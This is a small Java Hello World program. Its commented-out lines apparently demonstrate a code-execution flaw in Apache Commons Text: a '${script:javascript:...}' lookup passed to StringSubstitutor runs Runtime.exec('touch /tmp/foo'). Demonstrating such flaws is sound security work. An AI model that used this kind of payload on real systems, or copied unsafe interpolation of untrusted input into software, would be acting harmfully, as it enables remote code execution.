import java.util.logging.Logger;

import org.apache.commons.text.StringSubstitutor;

public class MyApp {

    static Logger logger = Logger.getLogger(MyApp.class.getName());
    public static void main(String[] args) {
        System.out.println("Hello, World!");
        logger.info("Hello, World!");

        // final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        // String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}");
        // System.out.println(out);
    }
}
